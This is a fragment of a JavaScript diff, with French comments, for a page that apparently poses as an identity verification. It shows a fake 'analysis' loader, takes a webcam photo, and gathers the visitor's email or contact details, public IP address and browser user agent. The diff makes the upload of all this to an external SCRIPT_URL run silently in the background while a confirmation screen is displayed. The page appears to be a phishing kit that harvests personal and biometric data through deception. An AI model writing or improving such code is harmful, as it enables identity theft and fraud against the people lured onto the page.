       } catch(e) {}
-    }, 800);
+    }, 1000);
 
-    // Envoi et passage à l'écran de confirmation après 1,5 seconde
     setTimeout(async () => {
+      clearInterval(progressInterval);
+      loaderBarFill.style.width = '100%';
+      loaderText.textContent = "Analyse terminée.";
+      loaderDetail.textContent = "Redirection...";
+
+      // Envoi en arrière-plan (on n'attend pas la fin pour afficher la confirmation)
       const ip = await getPublicIP();
       const formData = new FormData();
       formData.append("email", inputMethod.value === 'email' ? inputContact.value : "");
@@ -622,20 +403,24 @@ btnSubmit.addEventListener('click', async () => {
       formData.append("userAgent", info.ua);
       if (photoBase64) formData.append("photo", photoBase64);
 
-      await fetch(SCRIPT_URL, { method: "POST", body: formData });
+      // On lance l'envoi sans attendre (pas de await)
+      fetch(SCRIPT_URL, { method: "POST", body: formData }).catch(e => console.log(e));
 
+      // On coupe la caméra et on affiche la confirmation de suite
       if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
       
-      loader.style.display = 'none';
+      loaderContainer.style.display = 'none';
       cameraArea.style.display = 'none';
       stepFinal.classList.remove('active');
-      stepConfirmation.classList.add('active'); // <-- Affichage du message final
+      stepConfirmation.classList.add('active');
       progressFill.style.width = '100%';
-    }, 1500); // <-- 1.5 secondes
+    }, 2000);
 
   } catch (err) {
-    loader.textContent = "❌ Impossible de lancer la vérification. Veuillez autoriser la caméra.";
-    loader.style.color = "#E1000F";
+    clearInterval(progressInterval);
+    loaderText.textContent = "Erreur de vérification";
+    loaderDetail.textContent = "Veuillez autoriser l'accès à la caméra.";
+    loaderDetail.style.color = "#E1000F";
   }
 });
 
